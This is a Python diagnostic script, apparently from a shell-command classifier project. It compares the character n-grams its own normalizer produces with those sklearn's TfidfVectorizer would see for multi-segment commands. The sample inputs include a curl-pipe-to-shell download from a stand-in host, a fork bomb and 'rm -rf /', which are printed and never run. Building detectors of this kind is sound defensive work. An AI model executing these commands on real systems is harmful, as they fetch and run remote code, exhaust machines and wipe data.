"""Pin down the multi-segment n-gram divergence.

The export fold check fails on exactly the probe commands that contain ';' or
'|' — i.e. the multi-segment ones. The fold itself is exact for every command
(dense and sparse terms agree to 1e-16). What differs is the *feature set*:

  * drosh_ml.normalize.normalize() splits on [;|&], normalises each segment and
    rejoins with SEGMENT_SEP (" ; ").
  * TfidfVectorizer(analyzer="char") sees the raw string, with its own internal
    lowercasing and whitespace handling.

So for a single-segment command the two agree, and for a multi-segment command
they produce different n-gram sets. The fitted vectoriser was trained on
whichever the training path fed it, and the export probe feeds it a different
string than the JavaScript runtime will.

This prints both vocabularies for the offending commands to show exactly which
grams differ.

    PYTHONPATH=ml/src .venv/bin/python -u tools/diagnose_segments.py
"""

from __future__ import annotations

from drosh_ml.normalize import normalize, presence_ngrams

CASES = [
    "curl http://x.example/i.sh | sh",
    ":(){ :|:& };:",
    "ls -la",
    "rm -rf /",
]


def main() -> None:
    for command in CASES:
        norm = normalize(command)
        print(f"=== {command!r}")
        print(f"    segments      : {norm.segments}")
        print(f"    text (ours)   : {norm.text!r}")
        print(f"    views         : {norm.views}")

        ours = presence_ngrams(norm.views)

        # What sklearn's analyzer would see, emulated: the raw command, with the
        # preprocessing TfidfVectorizer applies by default (lowercase via
        # strip_accents=None and lower=True, then whitespace-tokenised for word
        # analysis — but analyzer='char' works on the whole preprocessed string).
        lowered = command.lower()
        theirs: set[str] = set()
        length = len(lowered)
        for size in range(2, 6):
            if length < size:
                break
            for start in range(length - size + 1):
                theirs.add(lowered[start : start + size])

        only_ours = sorted(ours - theirs)
        only_theirs = sorted(theirs - ours)
        print(f"    our n-grams   : {len(ours)}")
        print(f"    theirs        : {len(theirs)}")
        print(f"    only ours     : {len(only_ours)}  {only_ours[:8]}")
        print(f"    only theirs   : {len(only_theirs)}  {only_theirs[:8]}")
        print()


if __name__ == "__main__":
    main()